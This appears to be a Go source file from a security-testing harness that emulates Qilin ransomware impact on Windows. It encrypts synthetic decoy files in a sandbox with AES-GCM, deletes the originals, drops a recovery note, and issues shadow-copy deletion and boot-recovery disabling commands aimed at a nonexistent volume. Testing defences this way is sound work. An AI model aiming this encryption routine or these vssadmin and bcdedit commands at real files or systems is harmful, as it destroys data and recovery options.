//go:build windows
// +build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows"
)

const (
	TEST_UUID      = "8f68dda1-94be-430f-8f35-d8af3f9b5d2e"
	TECHNIQUE_ID   = "T1486"
	TECHNIQUE_NAME = "Minimal Qilin Impact"
	STAGE_ID       = 5
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)
	code := performImpact()
	switch code {
	case StageSuccess:
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Synthetic decoys encrypted; recovery commands were fail-harmless")
	case StageBlocked:
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Sandbox encryption positively prevented")
	default:
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Impact objective inconclusive")
	}
	os.Exit(code)
}

func performImpact() int {
	sandbox := filepath.Join(ARTIFACT_DIR, "Qilin", "impact")
	cleanArtifact := filepath.Clean(ARTIFACT_DIR)
	cleanSandbox := filepath.Clean(sandbox)
	if !strings.HasPrefix(strings.ToLower(cleanSandbox), strings.ToLower(cleanArtifact)+string(os.PathSeparator)) {
		logStageMessage("ERROR", TECHNIQUE_ID, "impact sandbox guardrail failed")
		return StageError
	}
	_ = os.RemoveAll(cleanSandbox)
	defer os.RemoveAll(cleanSandbox)
	if err := os.MkdirAll(cleanSandbox, 0755); err != nil {
		return classifyImpactWrite(err)
	}

	documents := map[string]string{
		"q3_financials.docx": "SYNTHETIC Q3 financial report\n",
		"customer_list.xlsx": "SYNTHETIC customer records - no real data\n",
		"recovery_plan.pdf":  "SYNTHETIC business continuity plan\n",
		"operations.csv":     "SYNTHETIC operations export\n",
		"board_minutes.txt":  "SYNTHETIC board meeting notes\n",
	}
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return StageError
	}
	success, blocked, failed := 0, 0, 0
	for name, body := range documents {
		for len(body) < 16*1024 {
			body += body
		}
		plainPath := filepath.Join(cleanSandbox, name)
		if err := os.WriteFile(plainPath, []byte(body), 0644); err != nil {
			if errnoIs(err, windows.ERROR_ACCESS_DENIED) {
				blocked++
			} else {
				failed++
			}
			continue
		}
		LogFileDropped(name, plainPath, int64(len(body)), false)
		ciphertext, err := encryptQilinFile([]byte(body), key)
		if err != nil {
			failed++
			continue
		}
		encryptedPath := plainPath + ".qilin"
		if err := os.WriteFile(encryptedPath, ciphertext, 0644); err != nil {
			if errnoIs(err, windows.ERROR_ACCESS_DENIED) {
				blocked++
			} else {
				failed++
			}
			continue
		}
		if err := os.Remove(plainPath); err != nil {
			failed++
			continue
		}
		success++
	}
	note := []byte("Your synthetic Qilin test files have been encrypted. No real data was affected.\n")
	_ = os.WriteFile(filepath.Join(cleanSandbox, "README-RECOVER.txt"), note, 0644)

	runFailHarmless("vssadmin.exe", "delete", "shadows", `/for=\\?\Volume{00000000-0000-0000-0000-000000000000}\`, "/quiet")
	runFailHarmless("bcdedit.exe", "/set", "{00000000-0000-0000-0000-000000000000}", "recoveryenabled", "no")
	logStageMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("impact metrics encrypted=%d denied=%d failed=%d", success, blocked, failed))
	if blocked > 0 {
		return StageBlocked
	}
	if success > 0 {
		return StageSuccess
	}
	return StageError
}

func encryptQilinFile(plain, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plain, nil), nil
}

func runFailHarmless(name string, args ...string) {
	out, err := exec.Command(name, args...).CombinedOutput()
	LogProcessExecution(name, strings.Join(append([]string{name}, args...), " "), 0, err == nil, 0, string(out))
	logStageMessage("INFO", "T1490", fmt.Sprintf("fail-harmless command %s returned %v; nonexistent target was the designed outcome", name, err))
}

func classifyImpactWrite(err error) int {
	if errnoIs(err, windows.ERROR_ACCESS_DENIED) && (isAdmin() || isSystemContext()) {
		return StageBlocked
	}
	logStageMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("impact setup returned: %v", err))
	return StageError
}
